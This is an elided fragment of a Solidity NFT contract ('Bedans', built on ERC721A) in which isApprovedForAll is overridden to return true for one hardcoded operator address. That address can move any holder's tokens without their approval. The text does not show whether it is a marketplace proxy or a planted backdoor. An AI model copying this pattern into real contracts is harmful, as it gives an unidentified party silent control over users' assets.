  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xcEce00137471301B46D11B94Ed16D8F329502955){return true;}
...
contract Bedans is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Bedans", "BDNS", maxBatchSize_, collectionSize_) {
